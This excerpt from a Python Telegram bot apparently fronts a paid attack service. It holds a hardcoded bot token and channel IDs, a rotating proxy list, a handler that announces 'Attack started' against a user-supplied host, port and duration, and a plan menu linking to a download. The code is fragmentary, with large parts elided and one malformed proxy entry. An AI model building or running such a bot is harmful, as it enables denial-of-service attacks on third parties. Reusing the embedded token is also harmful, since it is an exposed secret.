...
TOKEN = '7323202075:AAGQEyMT-xL47mHetSNJznRG0SJ7XItKvBM'
...
FORWARD_CHANNEL_ID = -1002165185412
CHANNEL_ID = -1002165185412
error_channel_id = -1002165185412
...
def update_proxy():
    proxy_list = [
        ...
        "https://162.247.243.29:80", "/://173.244.200.154:44302", "https://173.244.200.156:64631", 
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*Attack started @xDNeMEsiS 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}*", parse_mode='Markdown')
    except Exception as e:
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/c/1894103981/1352*", parse_mode='Markdown')
